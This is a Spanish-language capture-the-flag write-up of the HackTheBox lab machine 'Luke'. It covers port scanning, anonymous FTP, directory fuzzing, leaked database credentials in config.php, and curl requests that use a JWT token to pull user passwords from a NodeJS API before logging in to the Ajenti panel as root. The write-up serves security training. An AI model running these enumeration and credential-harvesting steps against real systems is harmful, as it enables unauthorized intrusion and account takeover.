# Máquina "Luke" de HackTheBox

**Características:**

- Linux 
- FreeBSD
- FTP Enumeration
- Information Leakage
- Abusing NodeJS Application
- API Enumeration
- Abusing Ajenti Administration Panel
- External
- FTP
- PHP
- Penetration Tester Level 1
- Anonymous/Guest Access
- A07:2021-Identification And Authentication Failures
- NodeJS
- Clear Text Credentials
- A02:2021-Cryptographic Failures
- Password Reuse
- A05:2021-Security Misconfiguration
- Misconfiguration

**Útil en:**

- eWPT

**IP:** 10.10.10.137

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Luke
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti
```

Lanzamos `whatweb`:

```bash
whatweb http://10.10.10.137
 
http://10.10.10.137 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], Email[contact@luke.io], HTML5, HTTPServer[FreeBSD][Apache/2.4.38 (FreeBSD) PHP/7.3.3], IP[10.10.10.137], JQuery, PHP[7.3.3], Script, Title[Luke] 

whatweb http://10.10.10.137:3000

http://10.10.10.137:3000 [200 OK] Country[RESERVED][ZZ], IP[10.10.10.137], X-Powered-By[Express]
 
whatweb http://10.10.10.137:8000
 
http://10.10.10.137:8000 [200 OK] Cookies[session], Country[RESERVED][ZZ], HTML5, HttpOnly[session], IP[10.10.10.137], PasswordField[password], Script, Title[Ajenti], UncommonHeaders[x-auth-status]
```

Vemos el puerto 21 FTP, así que tratamos de conectarnos con usuario `anonymous` y podemos ingresar sin contraseña. Lanzamos:

```bash
ftp 10.10.10.137
ls -a 
```

Se puede ver `webapp`:

```bash
cd webapp
```

Y se ve un archivo `for_Chihiro.txt`:

```bash
get for_Chihiro.txt
```

Podemos ver un mensaje dentro.

Vamos a la página web y podemos ver 2 versiones desactualizadas de jQuery, que son jQuery 1.11.3 y jQuery UI 1.9.2, propensas a un XSS y a un Prototype Pollution.

En la web con el puerto 3000 vemos un mensaje que dice `(auth token is not supplied)`, con una web representada en JSON que hemos visto algunas parecidas haciendo un `Authorization Bearer` con un hash.

En el puerto 8000 ha tardado demasiado en responder con credenciales comunes, así que no vendría bien un ataque automatizado. Vemos la web normal y lanzamos `Ctrl + U` para ver el código fuente y no vemos nada interesante, así que procedemos a fuzzear con `wfuzz`. Como la web trabaja con PHP podríamos intentar fuzzear con extensiones `.php` también, así que lanzamos:

```bash
sudo wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.137/FUZZ 2>/dev/null
```

Que `-c` es con colores y solo vemos 404, así que agregamos un `--hc=404` y ahora vemos:

```bash
000000268:   301        7 L      20 W       235 Ch      "member"       
000000441:   401        12 L     46 W       381 Ch      "management"   
000000550:   301        7 L      20 W       232 Ch      "css"          
000000953:   301        7 L      20 W       231 Ch      "js"           
000001481:   301        7 L      20 W       235 Ch      "vendor"       
000003295:   200        21 L     172 W      1093 Ch     "LICENSE"      
000045240:   200        108 L    240 W      205 Ch     "monarch"
```

Vamos a `10.10.10.137/monarch`, vemos un login así que probamos con credenciales comunes y nada. Ahora vamos a `member` y vemos una página que nos muestra `parent directory`, `vendor`, etc. Recordaremos el `management`, así que ahora lanzamos el fuzzing pero con extensión `.php`:

```bash
sudo wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.137/FUZZ.php 2>/dev/null
```

Vemos un `login.php` y un `config.php`. Vemos los dos y vamos a `config.php`, damos `Ctrl + U` y vemos credenciales:

```php
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";
```

Probamos en el panel login en el puerto 8000 Ajenti y nada, no funcionó en ningún panel de autenticación. Ahora vamos a fuzzear el puerto 3000 y obtenemos:

```bash
000000002:   200        0 L      5 W        56 Ch       "#"            
000000004:   200        0 L      5 W        56 Ch       "#"            
000000053:   200        0 L      2 W        13 Ch       "login"        
000000202:   200        0 L      5 W        56 Ch       "users"        
000000825:   200        0 L      2 W        13 Ch       "Login"        
000003701:   200        0 L      5 W        56 Ch       "Users"        
000045240:   200        0 L      5 W        56 Ch       "http://10.10.10.137:3000/"   
000101629:   200        0 L      2 W        13 Ch       "LogIn"        
000148853:   200        0 L      2 W        13 Ch       "LOGIN
```

Vamos al `login` pero vemos un panel vacío, así que probablemente debamos pasarlo por POST. Con `curl` haremos lo siguiente y como va a ser JSON para que interprete bien hay que jugar con los headers:

```bash
curl -s -X POST "http://10.10.10.137:3000/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}'
```

Nos devuelve:

```json
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo"}
```

Vemos un token que podemos pasar para ver cosas de la siguiente manera:

```bash
curl -s -X GET "http://10.10.10.137:3000/users" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo"
```

Y nos devuelve:

```json
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

Vemos 4 datos que podemos explotar de la siguiente forma:

```bash
curl -s -X GET "http://10.10.10.137:3000/users/Admin" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo"
```

Y nos devuelve:

```json
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
```

Tenemos la contraseña del usuario indicado. Rescatamos la de los otros:

```bash
for user in Admin Derry Yuri Dory; do curl -s -X GET "http://10.10.10.137:3000/users/$user" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo"; done
```

Y nos devuelve:

```bash
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}{"name":"Derry","password":"rZ86wwLvx7jUxtch"}{"name":"Yuri","password":"bet@tester87"}{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

Tenemos 4 paneles con lo que intentar y en `10.10.10.137/management`:

```json
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
```

(Revisar fuzzeo de máquinas con APIs backend, backend 2). Vamos al `config.json` y vemos varias cosas turbias:

```bash
http://10.10.10.137/management/config.json
```

<img src="/secciones/posts/imagenes/luke/turbio.png" alt="Texto alternativo" width="500">

Probaremos en el Ajenti, usuario `root` y la contraseña `KpMasng6S5EtTy9Z` y estamos dentro. Buscamos la flag.

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.
 